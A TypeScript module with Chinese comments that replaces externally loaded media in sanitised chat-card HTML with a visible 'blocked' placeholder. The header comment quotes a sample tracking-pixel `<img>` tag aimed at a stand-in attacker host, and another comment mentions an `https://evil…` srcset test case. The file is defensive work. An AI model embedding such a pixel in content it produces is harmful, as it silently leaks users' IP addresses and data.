/**
 * 外部媒體封鎖（M13 第一期 ⑤e，同 ST 的 `forbid_external_media`，**ST 預設也是開的**）。
 *
 * 🔴 **為什麼一張圖也是外洩管道**：卡片來自網路。只要它寫
 * `<img src="https://壞人.example/pixel.png?who=…">`，光是「你打開了這則訊息」
 * 就會把你的 IP、時間、以及網址裡夾帶的任何東西送出去 —— 使用者什麼都沒點。
 * ST 的擋法在 `scripts/chats.js:1937-2031`（`uponSanitizeElement` 直接 `node.remove()`）。
 *
 * 🔴 **我們不 remove，改成留一個看得見的佔位**。
 * 直接刪掉的話畫面上什麼都沒有，使用者只會覺得卡片壞了 —— 那是「靜默失敗」。
 * 本專案的判準是**每個死路都要有出口**：至少要說「這裡本來有一張外部圖片，被擋下來了」。
 *
 * ⚠️ **不用 `DOMPurify.addHook`**：那是**全域**註冊，會影響到程式裡任何一個
 * `DOMPurify.sanitize()` 呼叫點（包括之後別人新增的）。這種「在遠處生效」的機制
 * 正是最難追的一類 bug。⇒ 改成**淨化完之後自己走一遍 DOM**，作用域看得見。
 */

/** 會發出對外請求的元素。與 ST 那份清單一致。 */
const MEDIA = 'img,audio,video,source,track,embed,object,iframe';

/**
 * 這個網址會不會打到外面去。
 * 🔴 `data:` 與相對路徑**不算外部**（前者不發請求，後者只打我們自己）。
 * ⚠️ `//example.com` 這種**協定相對**網址會發請求，別漏了。
 */
export function isExternal(url: string): boolean {
  const v = url.trim();
  if (v === '') return false;
  if (v.startsWith('data:')) return false;
  if (v.startsWith('//')) return true;
  return /^[a-z][a-z0-9+.-]*:/i.test(v);
}

const holder = (doc: Document, why: string): HTMLElement => {
  const el = doc.createElement('span');
  el.setAttribute('data-blocked-media', '1');
  el.textContent = why;
  return el;
};

/**
 * 走過淨化後的 HTML，把會對外發請求的媒體換成佔位文字。
 * **輸入必須是已經淨化過的 HTML** —— 這一支不做淨化，只做封鎖。
 */
export function blockExternalMedia(html: string): string {
  // jsdom 與瀏覽器都有 DOMParser；沒有的話（例如 SSR）就原樣回去，不要炸。
  if (typeof DOMParser === 'undefined') return html;
  const doc = new DOMParser().parseFromString(`<body>${html}</body>`, 'text/html');
  for (const el of Array.from(doc.body.querySelectorAll(MEDIA))) {
    const urls = ['src', 'data', 'srcset', 'poster']
      .map((a) => el.getAttribute(a))
      .filter((v): v is string => v !== null);
    /**
     * `srcset` 是一串候選（`a.png 1x, b.png 2x`），**任何一個是外部的就整個擋掉**。
     * ⚠️ 逗號後面有空白 —— 先 `trim()` 再切，不然第二個候選會被讀成空字串而漏掉
     * （測試當場抓到的：`, https://evil…` 的 `split(' ')[0]` 是 `''`）。
     */
    const external = urls.some((u) =>
      u.split(',').some((part) => isExternal(part.trim().split(/\s+/)[0] ?? '')),
    );
    if (!external) continue;
    el.replaceWith(holder(doc, '（外部圖片已封鎖）'));
  }
  return doc.body.innerHTML;
}
